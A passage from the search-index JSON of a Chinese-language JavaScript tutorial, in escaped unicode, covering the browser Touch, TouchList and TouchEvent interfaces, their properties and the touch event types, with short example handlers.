window\uff09\u3001\u89e6\u6478\u70b9\u79bb\u5f00\u4e86\u6587\u6863\u533a\u57df\uff08\u8fdb\u5165\u6d4f\u89c8\u5668\u83dc\u5355\u680f\uff09\u3001\u7528\u6237\u7684\u89e6\u6478\u70b9\u592a\u591a\uff0c\u8d85\u8fc7\u4e86\u652f\u6301\u7684\u4e0a\u9650\uff08\u81ea\u52a8\u53d6\u6d88\u65e9\u5148\u7684\u89e6\u6478\u70b9\uff09\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 var el = document . getElementsByTagName ( 'canvas' )[ 0 ]; el . addEventListener ( 'touchstart' , handleStart , false ); el . addEventListener ( 'touchmove' , handleMove , false ); function handleStart ( evt ) { evt . preventDefault (); var touches = evt . changedTouches ; for ( var i = 0 ; i < touches . length ; i ++ ) { console . log ( touches [ i ]. pageX , touches [ i ]. pageY ); } } function handleMove ( evt ) { evt . preventDefault (); var touches = evt . changedTouches ; for ( var i = 0 ; i < touches . length ; i ++ ) { var touch = touches [ i ]; console . log ( touch . pageX , touch . pageY ); } }","title":"\u89e6\u6478\u4e8b\u4ef6"},{"location":"events/touch/#_1","text":"","title":"\u89e6\u6478\u4e8b\u4ef6"},{"location":"events/touch/#_2","text":"\u6d4f\u89c8\u5668\u7684\u89e6\u6478 API \u7531\u4e09\u4e2a\u90e8\u5206\u7ec4\u6210\u3002 Touch\uff1a\u4e00\u4e2a\u89e6\u6478\u70b9 TouchList\uff1a\u591a\u4e2a\u89e6\u6478\u70b9\u7684\u96c6\u5408 TouchEvent\uff1a\u89e6\u6478\u5f15\u53d1\u7684\u4e8b\u4ef6\u5b9e\u4f8b Touch \u63a5\u53e3\u7684\u5b9e\u4f8b\u5bf9\u8c61\u7528\u6765\u8868\u793a\u89e6\u6478\u70b9\uff08\u4e00\u6839\u624b\u6307\u6216\u8005\u4e00\u6839\u89e6\u6478\u7b14\uff09\uff0c\u5305\u62ec\u4f4d\u7f6e\u3001\u5927\u5c0f\u3001\u5f62\u72b6\u3001\u538b\u529b\u3001\u76ee\u6807\u5143\u7d20\u7b49\u5c5e\u6027\u3002\u6709\u65f6\uff0c\u89e6\u6478\u52a8\u4f5c\u7531\u591a\u4e2a\u89e6\u6478\u70b9\uff08\u591a\u6839\u624b\u6307\uff09\u7ec4\u6210\uff0c\u591a\u4e2a\u89e6\u6478\u70b9\u7684\u96c6\u5408\u7531 TouchList \u63a5\u53e3\u7684\u5b9e\u4f8b\u5bf9\u8c61\u8868\u793a\u3002 TouchEvent \u63a5\u53e3\u7684\u5b9e\u4f8b\u5bf9\u8c61\u4ee3\u8868\u7531\u89e6\u6478\u5f15\u53d1\u7684\u4e8b\u4ef6\uff0c\u53ea\u6709\u89e6\u6478\u5c4f\u624d\u4f1a\u5f15\u53d1\u8fd9\u4e00\u7c7b\u4e8b\u4ef6\u3002 \u5f88\u591a\u65f6\u5019\uff0c\u89e6\u6478\u4e8b\u4ef6\u548c\u9f20\u6807\u4e8b\u4ef6\u540c\u65f6\u89e6\u53d1\uff0c\u5373\u4f7f\u8fd9\u4e2a\u65f6\u5019\u5e76\u6ca1\u6709\u7528\u5230\u9f20\u6807\u3002\u8fd9\u662f\u4e3a\u4e86\u8ba9\u90a3\u4e9b\u53ea\u5b9a\u4e49\u9f20\u6807\u4e8b\u4ef6\u3001\u6ca1\u6709\u5b9a\u4e49\u89e6\u6478\u4e8b\u4ef6\u7684\u4ee3\u7801\uff0c\u5728\u89e6\u6478\u5c4f\u7684\u60c5\u51b5\u4e0b\u4ecd\u7136\u80fd\u7528\u3002\u5982\u679c\u60f3\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u53ef\u4ee5\u7528 event.preventDefault \u65b9\u6cd5\u963b\u6b62\u53d1\u51fa\u9f20\u6807\u4e8b\u4ef6\u3002","title":"\u89e6\u6478\u64cd\u4f5c\u6982\u8ff0"},{"location":"events/touch/#touch","text":"","title":"Touch \u63a5\u53e3"},{"location":"events/touch/#touch_1","text":"Touch \u63a5\u53e3\u4ee3\u8868\u5355\u4e2a\u89e6\u6478\u70b9\u3002\u89e6\u6478\u70b9\u53ef\u80fd\u662f\u4e00\u6839\u624b\u6307\uff0c\u4e5f\u53ef\u80fd\u662f\u4e00\u6839\u89e6\u6478\u7b14\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b Touch \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 Touch \u5b9e\u4f8b\u3002 1 var touch = new Touch ( touchOptions ); Touch \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u5b83\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 identifier \uff1a\u5fc5\u9700\uff0c\u7c7b\u578b\u4e3a\u6574\u6570\uff0c\u8868\u793a\u89e6\u6478\u70b9\u7684\u552f\u4e00 ID\u3002 target \uff1a\u5fc5\u9700\uff0c\u7c7b\u578b\u4e3a\u5143\u7d20\u8282\u70b9\uff0c\u8868\u793a\u89e6\u6478\u70b9\u5f00\u59cb\u65f6\u6240\u5728\u7684\u7f51\u9875\u5143\u7d20\u3002 clientX \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u6d4f\u89c8\u5668\u7a97\u53e3\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u8ddd\u79bb\uff0c\u9ed8\u8ba4\u4e3a0\u3002 clientY \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u6d4f\u89c8\u5668\u7a97\u53e3\u5de6\u4e0a\u89d2\u7684\u5782\u76f4\u8ddd\u79bb\uff0c\u9ed8\u8ba4\u4e3a0\u3002 screenX \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u8ddd\u79bb\uff0c\u9ed8\u8ba4\u4e3a0\u3002 screenY \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u5782\u76f4\u8ddd\u79bb\uff0c\u9ed8\u8ba4\u4e3a0\u3002 pageX \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u7f51\u9875\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u4f4d\u7f6e\uff08\u5373\u5305\u62ec\u9875\u9762\u7684\u6eda\u52a8\u8ddd\u79bb\uff09\uff0c\u9ed8\u8ba4\u4e3a0\u3002 pageY \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u7f51\u9875\u5de6\u4e0a\u89d2\u7684\u5782\u76f4\u4f4d\u7f6e\uff08\u5373\u5305\u62ec\u9875\u9762\u7684\u6eda\u52a8\u8ddd\u79bb\uff09\uff0c\u9ed8\u8ba4\u4e3a0\u3002 radiusX \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u5468\u56f4\u53d7\u5230\u5f71\u54cd\u7684\u692d\u5706\u8303\u56f4\u7684 X \u8f74\u534a\u5f84\uff0c\u9ed8\u8ba4\u4e3a0\u3002 radiusY \uff1a\u53ef\u9009\uff1a\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u5468\u56f4\u53d7\u5230\u5f71\u54cd\u7684\u692d\u5706\u8303\u56f4\u7684 Y \u8f74\u534a\u5f84\uff0c\u9ed8\u8ba4\u4e3a0\u3002 rotationAngle \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u533a\u57df\u7684\u692d\u5706\u7684\u65cb\u8f6c\u89d2\u5ea6\uff0c\u5355\u4f4d\u4e3a\u5ea6\u6570\uff0c\u57280\u523090\u5ea6\u4e4b\u95f4\uff0c\u9ed8\u8ba4\u503c\u4e3a0\u3002 force \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8303\u56f4\u5728 0 \u5230 1 \u4e4b\u95f4\uff0c\u8868\u793a\u89e6\u6478\u538b\u529b\u3002 0 \u4ee3\u8868\u6ca1\u6709\u538b\u529b\uff0c 1 \u4ee3\u8868\u786c\u4ef6\u6240\u80fd\u8bc6\u522b\u7684\u6700\u5927\u538b\u529b\uff0c\u9ed8\u8ba4\u4e3a 0 \u3002","title":"Touch \u63a5\u53e3\u6982\u8ff0"},{"location":"events/touch/#touch_2","text":"\uff081\uff09Touch.identifier Touch.identifier \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u89e6\u6478\u70b9\u7684\u552f\u4e00 ID\u3002\u8fd9\u4e2a\u503c\u5728\u6574\u4e2a\u89e6\u6478\u8fc7\u7a0b\u4fdd\u6301\u4e0d\u53d8\uff0c\u76f4\u5230\u89e6\u6478\u4e8b\u4ef6\u7ed3\u675f\u3002 1 2 3 4 5 someElement . addEventListener ( 'touchmove' , function ( e ) { for ( var i = 0 ; i < e . changedTouches . length ; i ++ ) { console . log ( e . changedTouches [ i ]. identifier ); } }, false ); \uff082\uff09Touch.screenX\uff0cTouch.screenY\uff0cTouch.clientX\uff0cTouch.clientY\uff0cpageX\uff0cpageY Touch.screenX \u5c5e\u6027\u548c Touch.screenY \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\u548c\u7eb5\u5750\u6807\uff0c\u4e0e\u9875\u9762\u662f\u5426\u6eda\u52a8\u65e0\u5173\u3002 Touch.clientX \u5c5e\u6027\u548c Touch.clientY \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u6d4f\u89c8\u5668\u89c6\u53e3\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\u548c\u7eb5\u5750\u6807\uff0c\u4e0e\u9875\u9762\u662f\u5426\u6eda\u52a8\u65e0\u5173\u3002 Touch.pageX \u5c5e\u6027\u548c Touch.pageY \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u5f53\u524d\u9875\u9762\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\u548c\u7eb5\u5750\u6807\uff0c\u5305\u542b\u4e86\u9875\u9762\u6eda\u52a8\u5e26\u6765\u7684\u4f4d\u79fb\u3002 \uff083\uff09Touch.radiusX\uff0cTouch.radiusY\uff0cTouch.rotationAngle Touch.radiusX \u5c5e\u6027\u548c Touch.radiusY \u5c5e\u6027\uff0c\u5206\u522b\u8fd4\u56de\u89e6\u6478\u70b9\u5468\u56f4\u53d7\u5230\u5f71\u54cd\u7684\u692d\u5706\u8303\u56f4\u7684 X \u8f74\u534a\u5f84\u548c Y \u8f74\u534a\u5f84\uff0c\u5355\u4f4d\u4e3a\u50cf\u7d20\u3002\u4e58\u4ee5 2 \u5c31\u53ef\u4ee5\u5f97\u5230\u89e6\u6478\u8303\u56f4\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u3002 Touch.rotationAngle \u5c5e\u6027\u8868\u793a\u89e6\u6478\u533a\u57df\u7684\u692d\u5706\u7684\u65cb\u8f6c\u89d2\u5ea6\uff0c\u5355\u4f4d\u4e3a\u5ea6\u6570\uff0c\u5728 0 \u5230 90 \u5ea6\u4e4b\u95f4\u3002 \u4e0a\u9762\u8fd9\u4e09\u4e2a\u5c5e\u6027\u5171\u540c\u5b9a\u4e49\u4e86\u7528\u6237\u4e0e\u5c4f\u5e55\u63a5\u89e6\u7684\u533a\u57df\uff0c\u5bf9\u4e8e\u63cf\u8ff0\u624b\u6307\u8fd9\u4e00\u7c7b\u975e\u7cbe\u786e\u7684\u89e6\u6478\uff0c\u5f88\u6709\u5e2e\u52a9\u3002\u6307\u5c16\u63a5\u89e6\u5c4f\u5e55\uff0c\u89e6\u6478\u8303\u56f4\u4f1a\u5f62\u6210\u4e00\u4e2a\u692d\u5706\uff0c\u8fd9\u4e09\u4e2a\u5c5e\u6027\u5c31\u7528\u6765\u63cf\u8ff0\u8fd9\u4e2a\u692d\u5706\u533a\u57df\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 div . addEventListener ( 'touchstart' , rotate ); div . addEventListener ( 'touchmove' , rotate ); div . addEventListener ( 'touchend' , rotate ); function rotate ( e ) { var touch = e . changedTouches . item ( 0 ); e . preventDefault (); src . style . width = touch . radiusX * 2 + 'px' ; src . style . height = touch . radiusY * 2 + 'px' ; src . style . transform = 'rotate(' + touch . rotationAngle + 'deg)' ; }; \uff084\uff09Touch.force Touch.force \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a 0 \u5230 1 \u4e4b\u95f4\u7684\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u538b\u529b\u3002 0 \u4ee3\u8868\u6ca1\u6709\u538b\u529b\uff0c 1 \u4ee3\u8868\u786c\u4ef6\u6240\u80fd\u8bc6\u522b\u7684\u6700\u5927\u538b\u529b\u3002 \uff085\uff09Touch.target Touch.target \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5143\u7d20\u8282\u70b9\uff0c\u4ee3\u8868\u89e6\u6478\u53d1\u751f\u65f6\u6240\u5728\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\u3002\u5373\u4f7f\u89e6\u6478\u70b9\u5df2\u7ecf\u79bb\u5f00\u4e86\u8fd9\u4e2a\u8282\u70b9\uff0c\u8be5\u5c5e\u6027\u4f9d\u7136\u4e0d\u53d8\u3002","title":"Touch \u63a5\u53e3\u7684\u5b9e\u4f8b\u5c5e\u6027"},{"location":"events/touch/#touchlist","text":"TouchList \u63a5\u53e3\u8868\u793a\u4e00\u7ec4\u89e6\u6478\u70b9\u7684\u96c6\u5408\u3002\u5b83\u7684\u5b9e\u4f8b\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u662f Touch \u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8868\u793a\u6240\u6709\u89e6\u6478\u70b9\u3002\u7528\u6237\u7528\u4e09\u6839\u624b\u6307\u89e6\u6478\uff0c\u4ea7\u751f\u7684 TouchList \u5b9e\u4f8b\u5c31\u4f1a\u5305\u542b\u4e09\u4e2a\u6210\u5458\uff0c\u6bcf\u6839\u624b\u6307\u7684\u89e6\u6478\u70b9\u5bf9\u5e94\u4e00\u4e2a Touch \u5b9e\u4f8b\u5bf9\u8c61\u3002 \u5b83\u7684\u5b9e\u4f8b\u4e3b\u8981\u901a\u8fc7\u89e6\u6478\u4e8b\u4ef6\u7684 TouchEvent.touches \u3001 TouchEvent.changedTouches \u3001 TouchEvent.targetTouches \u8fd9\u51e0\u4e2a\u5c5e\u6027\u83b7\u53d6\u3002 \u5b83\u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5\u53ea\u6709\u4e24\u4e2a\u3002 TouchList.length \uff1a\u6570\u503c\uff0c\u8868\u793a\u6210\u5458\u6570\u91cf\uff08\u5373\u89e6\u6478\u70b9\u7684\u6570\u91cf\uff09\u3002 TouchList.item() \uff1a\u8fd4\u56de\u6307\u5b9a\u4f4d\u7f6e\u7684\u6210\u5458\uff0c\u5b83\u7684\u53c2\u6570\u662f\u8be5\u6210\u5458\u7684\u4f4d\u7f6e\u7f16\u53f7\uff08\u4ece\u96f6\u5f00\u59cb\uff09\u3002","title":"TouchList \u63a5\u53e3"},{"location":"events/touch/#touchevent","text":"","title":"TouchEvent \u63a5\u53e3"},{"location":"events/touch/#_3","text":"TouchEvent \u63a5\u53e3\u7ee7\u627f\u4e86 Event \u63a5\u53e3\uff0c\u8868\u793a\u7531\u89e6\u6478\u5f15\u53d1\u7684\u4e8b\u4ef6\u5b9e\u4f8b\uff0c\u901a\u5e38\u6765\u81ea\u89e6\u6478\u5c4f\u6216\u8f68\u8ff9\u677f\u3002\u9664\u4e86\u88ab\u7ee7\u627f\u7684\u5c5e\u6027\u4ee5\u5916\uff0c\u5b83\u8fd8\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u5c5e\u6027\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b TouchEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u89e6\u6478\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u3002 1 new TouchEvent ( type , options ) TouchEvent() \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7c7b\u578b\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e8b\u4ef6\u7684\u914d\u7f6e\u5bf9\u8c61\uff0c\u8be5\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u4e5f\u662f\u53ef\u9009\u7684\u3002\u9664\u4e86 Event \u63a5\u53e3\u7684\u914d\u7f6e\u5c5e\u6027\uff0c\u8be5\u63a5\u53e3\u8fd8\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u914d\u7f6e\u5c5e\u6027\u3002 touches \uff1a TouchList \u5b9e\u4f8b\uff0c\u4ee3\u8868\u6240\u6709\u7684\u5f53\u524d\u5904\u4e8e\u6d3b\u8dc3\u72b6\u6001\u7684\u89e6\u6478\u70b9\uff0c\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u7a7a\u6570\u7ec4 [] \u3002 targetTouches \uff1a TouchList \u5b9e\u4f8b\uff0c\u4ee3\u8868\u6240\u6709\u5904\u5728\u89e6\u6478\u7684\u76ee\u6807\u5143\u7d20\u8282\u70b9\u5185\u90e8\u3001\u4e14\u4ecd\u7136\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u7684\u89e6\u6478\u70b9\uff0c\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u7a7a\u6570\u7ec4 [] \u3002 changedTouches \uff1a TouchList \u5b9e\u4f8b\uff0c\u4ee3\u8868\u672c\u6b21\u89e6\u6478\u4e8b\u4ef6\u7684\u76f8\u5173\u89e6\u6478\u70b9\uff0c\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u7a7a\u6570\u7ec4 [] \u3002 ctrlKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a Ctrl \u952e\u662f\u5426\u540c\u65f6\u6309\u4e0b\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 shiftKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a Shift \u952e\u662f\u5426\u540c\u65f6\u6309\u4e0b\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 altKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a Alt \u952e\u662f\u5426\u540c\u65f6\u6309\u4e0b\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 metaKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a Meta \u952e\uff08\u6216 Windows \u952e\uff09\u662f\u5426\u540c\u65f6\u6309\u4e0b\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002","title":"\u6982\u8ff0"},{"location":"events/touch/#_4","text":"TouchEvent \u63a5\u53e3\u7684\u5b9e\u4f8b\u5177\u6709 Event \u5b9e\u4f8b\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u6b64\u5916\u8fd8\u6709\u4e00\u4e9b\u5b83\u81ea\u5df1\u7684\u5b9e\u4f8b\u5c5e\u6027\uff0c\u8fd9\u4e9b\u5c5e\u6027\u5168\u90e8\u90fd\u662f\u53ea\u8bfb\u3002 \uff081\uff09TouchEvent.altKey\uff0cTouchEvent.ctrlKey\uff0cTouchEvent.shiftKey\uff0cTouchEvent.metaKey TouchEvent.altKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u89e6\u6478\u65f6\u662f\u5426\u6309\u4e0b\u4e86 Alt \u952e\u3002 TouchEvent.ctrlKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u89e6\u6478\u65f6\u662f\u5426\u6309\u4e0b\u4e86 Ctrl \u952e\u3002 TouchEvent.shiftKey \uff1a\u5e03\u5c14\u503c\uff1a\u8868\u793a\u89e6\u6478\u65f6\u662f\u5426\u6309\u4e0b\u4e86 Shift \u952e\u3002 TouchEvent.metaKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u89e6\u6478\u65f6\u662f\u5426\u6309\u4e0b\u4e86 Meta \u952e\uff08\u6216 Windows \u952e\uff09\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u3002 1 2 3 4 5 6 someElement . addEventListener ( 'touchstart' , function ( e ) { console . log ( 'altKey = ' + e . altKey ); console . log ( 'ctrlKey = ' + e . ctrlKey ); console . log ( 'metaKey = ' + e . metaKey ); console . log ( 'shiftKey = ' + e . shiftKey ); }, false ); \uff082\uff09TouchEvent.changedTouches TouchEvent.changedTouches \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a TouchList \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u4e00\u7ec4 Touch \u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8868\u793a\u672c\u6b21\u89e6\u6478\u4e8b\u4ef6\u7684\u76f8\u5173\u89e6\u6478\u70b9\u3002 \u5bf9\u4e8e\u4e0d\u540c\u7684\u65f6\u95f4\uff0c\u8be5\u5c5e\u6027\u7684\u542b\u4e49\u6709\u6240\u4e0d\u540c\u3002 touchstart \u4e8b\u4ef6\uff1a\u88ab\u6fc0\u6d3b\u7684\u89e6\u6478\u70b9 touchmove \u4e8b\u4ef6\uff1a\u53d1\u751f\u53d8\u5316\u7684\u89e6\u6478\u70b9 touchend \u4e8b\u4ef6\uff1a\u6d88\u5931\u7684\u89e6\u6478\u70b9\uff08\u5373\u4e0d\u518d\u88ab\u89e6\u78b0\u7684\u70b9\uff09 \u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u3002 1 2 3 4 5 someElement . addEventListener ( 'touchmove' , function ( e ) { for ( var i = 0 ; i < e . changedTouches . length ; i ++ ) { console . log ( e . changedTouches [ i ]. identifier ); } }, false ); \uff083\uff09TouchEvent.touches TouchEvent.touches \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a TouchList \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u6240\u6709\u4ecd\u7136\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\uff08\u5373\u89e6\u6478\u4e2d\uff09\u7684\u89e6\u6478\u70b9\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e2a\u624b\u6307\u5c31\u662f\u4e00\u4e2a\u89e6\u6478\u70b9\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 someElement . addEventListener ( 'touchstart' , function ( e ) { switch ( e . touches . length ) { // \u4e00\u6839\u624b\u6307\u89e6\u6478 case 1 : handle_one_touch ( e ); break ; // \u4e24\u6839\u624b\u6307\u89e6\u6478 case 2 : handle_two_touches ( e ); break ; // \u4e09\u6839\u624b\u6307\u89e6\u6478 case 3 : handle_three_touches ( e ); break ; // \u5176\u4ed6\u60c5\u51b5 default : console . log ( 'Not supported' ); break ; } }, false ); \uff084\uff09TouchEvent.targetTouches TouchEvent.targetTouches \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a TouchList \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u89e6\u6478\u4e8b\u4ef6\u7684\u76ee\u6807\u5143\u7d20\u8282\u70b9\u5185\u90e8\u3001\u6240\u6709\u4ecd\u7136\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\uff08\u5373\u89e6\u6478\u4e2d\uff09\u7684\u89e6\u6478\u70b9\u3002 1 2 3 function touches_in_target ( ev ) { return ( ev . touches . length === ev . targetTouches . length ? true : false ); } \u4e0a\u9762\u4ee3\u7801\u7528\u6765\u5224\u65ad\uff0c\u662f\u5426\u6240\u6709\u89e6\u6478\u70b9\u90fd\u5728\u76ee\u6807\u5143\u7d20\u5185\u3002","title":"\u5b9e\u4f8b\u5c5e\u6027"},{"location":"events/touch/#_5","text":"\u89e6\u6478\u5f15\u53d1\u7684\u4e8b\u4ef6\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u3002\u53ef\u4ee5\u901a\u8fc7 TouchEvent.type \u5c5e\u6027\uff0c\u67e5\u770b\u5230\u5e95\u53d1\u751f\u7684\u662f\u54ea\u4e00\u79cd\u4e8b\u4ef6\u3002 touchstart \uff1a\u7528\u6237\u5f00\u59cb\u89e6\u6478\u65f6\u89e6\u53d1\uff0c\u5b83\u7684 target \u5c5e\u6027\u8fd4\u56de\u53d1\u751f\u89e6\u6478\u7684\u5143\u7d20\u8282\u70b9\u3002 touchend \uff1a\u7528\u6237\u4e0d\u518d\u63a5\u89e6\u89e6\u6478\u5c4f\u65f6\uff08\u6216\u8005\u79fb\u51fa\u5c4f\u5e55\u8fb9\u7f18\u65f6\uff09\u89e6\u53d1\uff0c\u5b83\u7684 target \u5c5e\u6027\u4e0e touchstart \u4e8b\u4ef6\u4e00\u81f4\u7684\uff0c\u5c31\u662f\u5f00\u59cb\u89e6\u6478\u65f6\u6240\u5728\u7684\u5143\u7d20\u8282\u70b9\u3002\u5b83\u7684 changedTouches \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a TouchList \u5b9e\u4f8b\uff0c\u5305\u542b\u6240\u6709\u4e0d\u518d\u89e6\u6478\u7684\u89e6\u6478\u70b9\uff08\u5373 Touch \u5b9e\u4f8b\u5bf9\u8c61\uff09\u3002 touchmove \uff1a\u7528\u6237\u79fb\u52a8\u89e6\u6478\u70b9\u65f6\u89e6\u53d1\uff0c\u5b83\u7684 target \u5c5e\u6027\u4e0e touchstart \u4e8b\u4ef6\u4e00\u81f4\u3002\u5982\u679c\u89e6\u6478\u7684\u534a\u5f84\u3001\u89d2\u5ea6\u3001\u529b\u5ea6\u53d1\u751f\u53d8\u5316\uff0c\u4e5f\u4f1a\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002 touchcancel \uff1a\u89e6\u6478\u70b9\u53d6\u6d88\u65f6\u89e6\u53d1\uff0c\u6bd4\u5982\u5728\u89e6\u6478\u533a\u57df\u8df3\u51fa\u4e00\u4e2a\u6a21\u6001\u7a97\u53e3\uff08modal window\uff09\u3001\u89e6\u6478\u70b9\u79bb\u5f00\u4e86\u6587\u6863\u533a\u57df\uff08\u8fdb\u5165\u6d4f\u89c8\u5668\u83dc\u5355\u680f\uff09\u3001\u7528\u6237\u7684\u89e6\u6478\u70b9\u592a\u591a\uff0c\u8d85\u8fc7\u4e86\u652f\u6301\u7684\u4e0a\u9650\uff08\u81ea\u52a8\u53d6\u6d88\u65e9\u5148\u7684\u89e6\u6478\u70b9\uff09\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 var el = document . getElementsByTagName ( 'canvas' )[ 0 ]; el . addEventListener ( 'touchstart' , handleStart , false ); el . addEventListener ( 'touchmove' , handleMove , false ); function handleStart ( evt ) { evt . preventDefault (); var touches = evt . changedTouches ; for ( var i = 0 ; i < touches . length ; i ++ ) { console . log ( touches [ i ]. pageX , touches [ i ]. pageY ); } } function handleMove ( evt ) { evt . preventDefault (); var touches = evt . changedTouches ; for ( var i = 0 ; i < touches . length ; i ++ ) { var touch = touches [ i ]; console . log ( touch . pageX , touch . pageY ); } }","title":"\u89e6\u6478\u4e8b\u4ef6\u7684\u79cd\u7c7b"},{"location":"features/console/","text":"console \u5bf9\u8c61\u4e0e\u63a7\u5236\u53f0 \u00b6 console \u5bf9\u8c61 \u00b6 console \u5bf9\u8c61\u662f JavaScript \u7684\u539f\u751f\u5bf9\u8c61\uff0c\u5b83\u6709\u70b9\u50cf Unix \u7cfb\u7edf\u7684\u6807\u51c6\u8f93\u51fa stdout \u548c\u6807\u51c6\u9519\u8bef stderr \uff0c\u53ef\u4ee5\u8f93\u51fa\u5404\u79cd\u4fe1\u606f\u5230\u63a7\u5236\u53f0\uff0c\u5e76\u4e14\u8fd8\u63d0\u4f9b\u4e86\u5f88\u591a\u6709\u7528\u7684\u8f85\u52a9\u65b9\u6cd5\u3002 console \u7684\u5e38\u89c1\u7528\u9014\u6709\u4e24\u4e2a\u3002 